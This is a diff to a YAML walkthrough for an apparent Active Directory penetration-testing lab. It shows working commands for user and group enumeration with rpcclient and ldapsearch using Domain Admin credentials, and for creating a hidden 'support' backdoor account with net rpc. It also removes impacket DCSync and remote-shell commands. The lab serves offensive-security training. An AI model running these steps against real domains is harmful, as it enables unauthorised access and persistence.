@@ -599,24 +599,16 @@ walkthrough:
             rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'enumdomusers'
             ```
 
-            **Expected output:**
-            ```
-            user:[Administrator] rid:[0x1f4]
-            user:[Guest] rid:[0x1f5]
-            user:[krbtgt] rid:[0x1f6]
-            user:[jsmith] rid:[0x3e8]
-            user:[mwilliams] rid:[0x3e9]
-            user:[svc_backup] rid:[0x3ea]
-            ```
+            **Expected output:** A list of all domain users with their RIDs (Resource IDs). You should see Administrator, jsmith, mwilliams, svc_backup, and others.
 
             ### Get User Details
 
             ```bash
-            # Query the svc_backup account (RID 0x3ea = 1002)
-            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'queryuser 0x3ea'
+            # Query a specific user by username
+            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'queryuser svc_backup'
             ```
 
-            Notice the **description field** - it reveals the account's purpose!
+            Notice the **Description** field shows "Backup service account" - this reveals the account's purpose! Service accounts are often high-value targets.
 
             ### Enumerate Domain Groups
 
@@ -682,16 +674,14 @@ walkthrough:
             smbclient //172.16.2.12/netlogon -U 'Administrator%Adm1n2024' -c 'ls'
             ```
 
-            ### Cross-Domain Access
+            ### What This Proves
 
-            Domain Admin credentials work on ALL domain-joined systems:
+            Successfully accessing SYSVOL and NETLOGON confirms:
+            - Your credentials are valid Domain Admin
+            - You can read/write domain-wide configuration
+            - You have the highest level of access in the domain
 
-            ```bash
-            # Access sensitive share on file server using Domain Admin
-            smbclient //172.16.2.10/sensitive -U 'Administrator%Adm1n2024' -c 'ls'
-            ```
-
-            > **Notice:** You accessed the file server with Domain Admin credentials, not svc_backup. This demonstrates domain-wide access.
+            > **Note:** The file server in this lab uses local authentication, not domain authentication. In a real Windows environment, Domain Admin would grant access to all domain-joined systems.
 
         - id: step4_5
           vm: kali
@@ -701,17 +691,15 @@ walkthrough:
 
             A common post-exploitation technique is creating a hidden admin account for persistent access.
 
-            ### Create a New Domain User
+            ### Create a New Domain User with Password
+
+            The `net rpc` command creates users with a password in one step:
 
             ```bash
-            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'createdomuser support'
+            net rpc user add support 'P@ssw0rd123!' -U 'Administrator%Adm1n2024' -S 172.16.2.12
             ```
 
-            ### Set the Password
-
-            ```bash
-            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'setuserinfo2 support 24 P@ssw0rd123!'
-            ```
+            **Expected output:** `Added user 'support'.`
 
             ### Verify the Account Exists
 
@@ -725,7 +713,9 @@ walkthrough:
             smbclient -L //172.16.2.12 -U 'support%P@ssw0rd123!'
             ```
 
-            > **In real environments:** Attackers create accounts like "support", "svc_scanner", or "admin2" that blend in. Blue teams should monitor for unexpected account creation.
+            You should see the share listing, confirming the account works!
+
+            > **Attacker tradecraft:** Accounts named "support", "svc_scanner", or "helpdesk" blend in with legitimate accounts. Blue teams should alert on any new account creation.
 
             ### Why This Matters
 
@@ -748,10 +738,12 @@ walkthrough:
 
             LDAP provides more detailed information than RPC. Let's extract everything.
 
+            > **Note:** Samba AD requires encrypted LDAP connections. We use `-ZZ` for StartTLS and `LDAPTLS_REQCERT=never` to accept self-signed certificates.
+
             ### List All Users with Details
 
             ```bash
-            ldapsearch -x -H ldap://172.16.2.12 \
+            LDAPTLS_REQCERT=never ldapsearch -x -H ldap://172.16.2.12 -ZZ \
               -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
               -w 'Adm1n2024' \
               -b 'cn=Users,DC=acmewidgets,DC=local' \
@@ -763,7 +755,7 @@ walkthrough:
             Service accounts often have elevated privileges and weak passwords:
 
             ```bash
-            ldapsearch -x -H ldap://172.16.2.12 \
+            LDAPTLS_REQCERT=never ldapsearch -x -H ldap://172.16.2.12 -ZZ \
               -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
               -w 'Adm1n2024' \
               -b 'DC=acmewidgets,DC=local' \
@@ -773,7 +765,7 @@ walkthrough:
             ### Export Domain Admin Members
 
             ```bash
-            ldapsearch -x -H ldap://172.16.2.12 \
+            LDAPTLS_REQCERT=never ldapsearch -x -H ldap://172.16.2.12 -ZZ \
               -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
               -w 'Adm1n2024' \
               -b 'DC=acmewidgets,DC=local' \
@@ -784,45 +776,32 @@ walkthrough:
 
         - id: step5_2
           vm: kali
-          title: "Windows AD: What's Different"
+          title: "Skills That Transfer to Windows AD"
           content: |
-            ## Windows AD Attacks (Educational Reference)
+            ## What You Learned Applies Everywhere
 
-            This lab uses Samba AD. In a **Windows AD** environment, you'd have additional attack options.
+            This lab uses **Samba AD** (Linux-based), but the skills you practiced transfer directly to Windows Active Directory:
 
-            ### DCSync Attack (Windows Only)
+            | Skill | Works on Samba | Works on Windows |
+            |-------|----------------|------------------|
+            | SMB authentication | ✅ | ✅ |
+            | RPC user/group enumeration | ✅ | ✅ |
+            | LDAP queries | ✅ | ✅ |
+            | Password policy checks | ✅ | ✅ |
+            | Backdoor account creation | ✅ | ✅ |
 
-            DCSync replicates password hashes directly from a Domain Controller:
+            ### Windows-Only Attacks (For Future Learning)
 
-            ```bash
-            # This would work on Windows AD, NOT in this lab
-            impacket-secretsdump 'ACMEWIDGETS/Administrator:Adm1n2024@DC_IP'
-            ```
+            When you encounter **Windows AD** in other labs or real engagements, you'll have additional options:
 
-            **Why it doesn't work here:** DCSync uses Windows DRSUAPI (replication protocol). Samba doesn't implement this.
+            - **DCSync** - Extract all password hashes from the domain
+            - **PSExec/WMIExec** - Get remote shells on Windows machines
+            - **Kerberoasting** - Crack service account passwords
+            - **Pass-the-Hash** - Authenticate with NTLM hashes
 
-            ### Remote Code Execution (Windows Only)
+            These require Windows-specific protocols that Samba doesn't implement.
 
-            ```bash
-            # PSExec - creates a service on target
-            impacket-psexec 'Administrator:Adm1n2024@TARGET_IP'
-
-            # WMIExec - uses Windows Management Instrumentation
-            impacket-wmiexec 'Administrator:Adm1n2024@TARGET_IP'
-            ```
-
-            **Why these don't work here:** They require Windows services (SCM, WMI) that don't exist on Linux/Samba.
-
-            ### What DOES Transfer
-
-            The skills you practiced work everywhere:
-            - ✅ SMB enumeration and authentication
-            - ✅ RPC-based user/group enumeration
-            - ✅ LDAP queries and data extraction
-            - ✅ Password policy analysis
-            - ✅ Account creation for persistence
-
-            > **Real-world insight:** Many networks mix Windows and Linux. Knowing both attack surfaces makes you more effective.
+            > **Key takeaway:** Master the fundamentals here (enumeration, lateral movement, persistence) - they're the foundation for all AD attacks.
 
         - id: step5_3
           vm: kali
